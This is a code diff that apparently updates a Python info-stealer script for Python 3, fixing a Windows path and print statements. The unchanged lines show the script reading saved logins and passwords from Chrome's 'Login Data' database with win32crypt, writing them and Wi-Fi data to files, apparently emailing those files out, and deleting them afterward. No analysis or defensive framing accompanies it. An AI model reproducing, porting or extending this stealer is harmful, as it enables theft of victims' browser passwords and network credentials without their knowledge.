@@ -82,7 +82,7 @@ def history():
 history()
 def chrome():
    import os,sqlite3,win32crypt
-   data=os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+   data=os.path.expanduser('~')+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
    connection = sqlite3.connect(data)
    cursor = connection.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
@@ -144,7 +144,7 @@ try:
    fo.close()
    os.remove("wifi.txt")
 except Exception:
-   print "Error: unable to send email"
+   print ("Error: unable to send email")
 #################################################
 filename = "chrome1.txt"
 fo1 = open(filename, "rb")
@@ -188,7 +188,7 @@ try:
    fo1.close()
    os.remove("chrome1.txt")
 except Exception:
-   print "Error: unable to send email"
+   print ("Error: unable to send email")
 ###########################################
 filename = "chrome.txt"
 fo = open(filename, "rb")
@@ -242,5 +242,5 @@ try:
    fo.close()
    os.remove("chrome.txt")
 except Exception:
-   print "Error: unable to send email"
+   print ("Error: unable to send email")
    
